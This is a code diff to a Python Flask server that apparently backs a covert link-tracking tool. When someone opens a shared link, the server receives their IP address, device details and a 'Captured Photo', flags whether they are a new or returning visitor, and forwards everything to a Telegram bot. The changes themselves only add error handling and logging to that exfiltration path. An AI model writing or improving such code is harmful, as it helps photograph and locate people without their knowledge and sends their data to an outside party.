@@ -18,15 +18,23 @@ tracked_users = {}
 
 def send_telegram_message(text):
     """Send text message to Telegram bot."""
-    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
-    response = requests.post(TELEGRAM_API, json=payload)
-    print("📩 Message Response:", response.text)  # ✅ Debugging
+    try:
+        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
+        response = requests.post(TELEGRAM_API, json=payload, timeout=10)
+        response.raise_for_status()  # ✅ Raise error if API request fails
+        print("📩 Message Sent:", response.text)
+    except requests.exceptions.RequestException as e:
+        print("❌ Telegram API Error:", str(e))
 
 def send_telegram_photo(image_url, caption):
     """Send an image to Telegram bot."""
-    payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
-    response = requests.post(TELEGRAM_PHOTO_API, json=payload)
-    print("📷 Photo Response:", response.text)  # ✅ Debugging
+    try:
+        payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
+        response = requests.post(TELEGRAM_PHOTO_API, json=payload, timeout=10)
+        response.raise_for_status()
+        print("📷 Photo Sent:", response.text)
+    except requests.exceptions.RequestException as e:
+        print("❌ Telegram API Error:", str(e))
 
 @app.route('/')
 def home():
@@ -44,7 +52,7 @@ def track_device(session_id):
 
     try:
         data = request.json
-        print("📥 Received Data:", data)  # ✅ Debugging
+        print("📥 Received Data:", json.dumps(data, indent=2))  # ✅ Debugging
 
         if not data:
             return jsonify({"error": "Invalid JSON data"}), 400
@@ -54,13 +62,10 @@ def track_device(session_id):
         device = data.get("device", {})
         photo = data.get("photo", None)
 
-        # ✅ Check if user is already tracked
+        # ✅ Get User IP & Session Tracking
         user_ip = device.get("ip", "Unknown")
-        if user_ip in tracked_users:
-            message_status = "🔁 User revisited."
-        else:
-            message_status = "🆕 New User Clicked the Link!"
-            tracked_users[user_ip] = session_id  # Store user IP and session
+        message_status = "🔁 User revisited." if user_ip in tracked_users else "🆕 New User Clicked the Link!"
+        tracked_users[user_ip] = session_id  # Store user session
 
         # ✅ Format Message
         message = f"""
@@ -79,7 +84,7 @@ def track_device(session_id):
 
         send_telegram_message(message)
 
-        # ✅ Handle Photo
+        # ✅ Handle Photo (Only Send if Available)
         if photo:
             send_telegram_photo(photo, "📷 Captured Photo")
 
